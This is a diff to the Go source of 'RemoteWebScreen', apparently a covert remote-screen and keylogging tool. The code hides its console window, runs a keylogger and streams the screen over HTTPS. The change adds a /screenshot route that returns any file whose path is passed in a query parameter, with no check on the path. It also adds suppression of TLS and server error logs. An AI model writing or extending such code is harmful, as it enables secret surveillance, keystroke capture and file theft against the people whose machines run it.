@@ -9,11 +9,14 @@ import (
 	"embed"
 	"fmt"
 	"html/template"
+	"io"
 	"io/ioutil"
+	"log"
 	"net"
 	"net/http"
 	"os"
 	"path/filepath"
+	"strings"
 	"time"
 )
 
@@ -29,7 +32,47 @@ func init() {
 	win32.HideConsole()
 }
 
+// 自定义 logger，过滤 TLS handshake error
+type filteredLogger struct {
+	logger *log.Logger
+}
+
+func (fl *filteredLogger) Write(p []byte) (n int, err error) {
+	msg := string(p)
+	// 过滤掉 TLS handshake error
+	if strings.Contains(msg, "TLS handshake error") {
+		return len(p), nil
+	}
+	return fl.logger.Writer().Write(p)
+}
+
+func printBanner() {
+	banner := `
+╔═══════════════════════════════════════════════════════════════╗
+║                                                               ║
+║   ██████╗ ███████╗███╗   ███╗ ██████╗ ████████╗███████╗     	║
+║   ██╔══██╗██╔════╝████╗ ████║██╔═══██╗╚══██╔══╝██╔════╝     	║
+║   ██████╔╝█████╗  ██╔████╔██║██║   ██║   ██║   █████╗      	║
+║   ██╔══██╗██╔══╝  ██║╚██╔╝██║██║   ██║   ██║   ██╔══╝       	║
+║   ██║  ██║███████╗██║ ╚═╝ ██║╚██████╔╝   ██║   ███████╗     	║
+║   ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝    ╚═╝   ╚══════╝     	║
+║                                                               ║
+║     	   RemoteWebScreen       Author: p1d3er      	        ║
+╚═══════════════════════════════════════════════════════════════╝
+`
+	fmt.Println(banner)
+	fmt.Println("服务启动...")
+	fmt.Println()
+}
+
 func main() {
+	// 设置自定义 logger，过滤 TLS handshake error
+	customLogger := &filteredLogger{
+		logger: log.New(os.Stdout, "", log.LstdFlags),
+	}
+	log.SetOutput(customLogger)
+
+	
 	listenAddress := ":443"
 	if len(os.Args) == 1 {
 		os.Exit(0)
@@ -39,6 +82,7 @@ func main() {
 	} else {
 		os.Exit(0)
 	}
+	printBanner()
 	certData, _ := templates.ReadFile("certs/server.pem")
 	keyData, _ := templates.ReadFile("certs/server.key")
 	caCert, err := templates.ReadFile("certs/ca.pem")
@@ -66,6 +110,7 @@ func main() {
 	}
 	SimulateDesktopwsPort := SimulateDesktopListener.Addr().(*net.TCPAddr).Port
 	go keyboard.Keylog()
+
 	http.HandleFunc("/"+listenAddress, func(w http.ResponseWriter, r *http.Request) {
 		w.Header().Set("Content-Type", "text/html")
 		contentBytes, err := templates.ReadFile("index.html")
@@ -97,17 +142,43 @@ func main() {
 			//http.Error(w, "Error executing HTML template", http.StatusInternalServerError)
 		}
 	})
+	// 添加截屏图片访问路由
+	http.HandleFunc("/screenshot", func(w http.ResponseWriter, r *http.Request) {
+		imagePath := r.URL.Query().Get("path")
+		if imagePath == "" {
+			http.Error(w, "Missing path parameter", http.StatusBadRequest)
+			return
+		}
+		// 读取图片文件
+		imageData, err := ioutil.ReadFile(imagePath)
+		if err != nil {
+			http.Error(w, "Image not found", http.StatusNotFound)
+			return
+		}
+		// 设置响应头
+		w.Header().Set("Content-Type", "image/png")
+		w.Write(imageData)
+	})
 	go func() {
-		if err := http.Serve(httpsListener, nil); err != nil {
+		// 创建自定义 HTTP 服务器，设置 ErrorLog
+		httpsServer := &http.Server{
+			Handler:  nil,
+			ErrorLog: log.New(io.Discard, "", 0), // 禁用错误日志
+		}
+		if err := httpsServer.Serve(httpsListener); err != nil {
 			//log.Fatalf("Failed to start HTTPS server: %v", err)
 		}
 	}()
 	go func() {
 		http.HandleFunc("/SimulateDesktop", server.ScreenshotHandler)
 	}()
-	if err := http.Serve(SimulateDesktopListener, nil); err != nil {
-		//log.Printf("Failed to start WebSocket server: %v", err)
+
+	// 创建 WebSocket 服务器，设置 ErrorLog
+	wsServer := &http.Server{
+		Handler:  nil,
+		ErrorLog: log.New(io.Discard, "", 0), // 禁用错误日志
 	}
+
 	go func() {
 		ticker := time.NewTicker(30 * time.Second)
 		defer ticker.Stop()
@@ -116,4 +187,8 @@ func main() {
 			server.CleanupConnections()
 		}
 	}()
+
+	if err := wsServer.Serve(SimulateDesktopListener); err != nil {
+		//log.Printf("Failed to start WebSocket server: %v", err)
+	}
 }
